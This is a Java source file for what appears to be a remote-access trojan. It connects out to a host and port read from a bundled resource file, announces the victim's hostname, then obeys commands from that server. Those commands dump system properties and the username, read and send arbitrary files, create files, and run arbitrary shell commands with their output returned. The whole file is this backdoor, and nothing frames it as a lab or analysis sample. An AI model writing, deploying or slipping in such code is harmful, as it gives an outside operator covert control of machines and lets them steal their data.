import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Collection;
import java.util.Map;
import java.util.Properties;
import java.util.Set;

public class Main {
    public static void main(String[] args) {
        try {
            InputStream inputStream = Main.class.getResource("resource/server.txt").openStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));

            String host = bufferedReader.readLine();
            int port = Integer.parseInt(bufferedReader.readLine());

            Socket socket = new Socket(host,port);
            OutputStream outputStream = socket.getOutputStream();
            InputStream in_socket = socket.getInputStream();
            PrintWriter printWriter = new PrintWriter(outputStream);
            BufferedReader get_buf = new BufferedReader(new InputStreamReader(in_socket));


            printWriter.println(" [Connect] "+ InetAddress.getLocalHost ().getHostName ());
            printWriter.flush();

            while (true) {
                String message = get_buf.readLine();
                if (message == null) {
                    break;
                }
                System.out.println(message);

                if (message.equals("none")) {
                    printWriter.println();
                    printWriter.flush();
                    continue;
                }
                if (message.equals("getinfo")) {
                    Properties properties = System.getProperties();
                    StringBuilder stringBuilder = new StringBuilder("");
                    stringBuilder.append("/n/n");

                    for (String properties_key : properties.stringPropertyNames())
                    {
                        stringBuilder.append(" --- ");
                        stringBuilder.append(properties_key);
                        stringBuilder.append(": ");
                        stringBuilder.append(properties.getProperty(properties_key));
                        stringBuilder.append("/n");
                    }
                    stringBuilder.append("");
                    printWriter.println(stringBuilder.toString());
                    printWriter.flush();
                    continue;
                }
                if (message.equals("getlogin")) {
                    Map<String,String> user = System.getenv();
                    printWriter.println(" [Login Now] "+user.get("USERNAME"));
                    printWriter.flush();
                    continue;
                }
                if (message.equals("pwd")) {
                    printWriter.println(System.getProperty("user.dir"));
                    printWriter.flush();
                    continue;
                }
                if (message.startsWith("touch ")) {
                    String create_path = message.substring(6);
                    File file = new File(create_path);
                    if (file.createNewFile()) {
                        printWriter.println("CREATE FILE: "+file.getName()+" OK");
                        printWriter.flush();
                        continue;
                    }
                    printWriter.println("FAIL TO CREATE FILE: "+file.getName());
                    printWriter.flush();
                    continue;
                }
                if (message.startsWith("cat ")) {
                    String cat_path = message.substring(4);
                    File file = new File(cat_path);
                    if (!file.exists()) {
                        printWriter.println("CAN NOT FIND TARGET FILE");
                        printWriter.flush();
                        continue;
                    }
                    else {
                        try {
                            FileReader fileReader = new FileReader(file);
                            BufferedReader reader = new BufferedReader(fileReader);
                            StringBuilder stringBuilder = new StringBuilder("");

                            while (true) {
                                String line = reader.readLine();
                                if (line == null) {
                                    break;
                                }
                                stringBuilder.append(line);
                                stringBuilder.append("/n");
                            }
                            reader.close();
                            fileReader.close();
                            printWriter.println(stringBuilder.toString());
                            printWriter.flush();
                            continue;
                        }catch (Exception exception){
                            printWriter.println("READ TARGET FILE ERROR");
                            printWriter.flush();
                            continue;
                        }
                    }
                }
                if (message.startsWith("shell:")) {
                    try {
                        String command = message.substring(6);
                        //System.out.print(command);
                        Runtime runtime = Runtime.getRuntime();
                        Process process = runtime.exec(command.split(" "));
                        InputStream in = process.getInputStream();

                        BufferedReader buf_shell = new BufferedReader(new InputStreamReader(in));
                        StringBuilder stringBuilder = new StringBuilder("");
                        while (true) {
                            String line = buf_shell.readLine();
                            if (line == null) {
                                break;
                            }
                            stringBuilder.append(line);
                            stringBuilder.append("/n");
                        }
                        buf_shell.close();
                        in.close();
                        //process.destroy();

                        System.out.println(stringBuilder.toString());
                        printWriter.println(stringBuilder.toString());
                        printWriter.flush();
                        continue;
                    }
                    catch (Exception exception){
                        printWriter.println("run command error");
                        printWriter.flush();
                    }
                }
                if (message.equals("exit")) {
                    System.exit(0);
                }
                else {
                    printWriter.println("send command error");
                    printWriter.flush();
                }
            }
            socket.close();
        }
        catch (Exception exception) {
            System.exit(0);
        }
    }
}
